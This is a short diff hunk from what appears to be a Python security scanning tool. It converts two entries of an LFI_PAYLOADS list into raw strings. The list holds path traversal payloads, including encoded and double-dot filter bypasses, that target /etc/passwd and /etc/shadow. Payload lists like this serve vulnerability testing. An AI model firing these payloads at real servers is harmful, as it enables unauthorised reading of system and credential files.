@@ -593,9 +593,9 @@ LFI_PAYLOADS = [
     '..%e0%80%af..%e0%80%afetc/passwd',
     # Double dots bypass (recursive filter)
     '....//....//....//....//....//etc/passwd',
-    '....\/....\/....\/....\/etc/passwd',
+    r'....\/....\/....\/....\/etc/passwd',
     '..././..././..././..././etc/passwd',
-    '....\\/....\\/....\\/etc/passwd',
+    r'....\\/....\\/....\\/etc/passwd',
     # Direct paths Linux
     '/etc/passwd',
     '/etc/shadow',
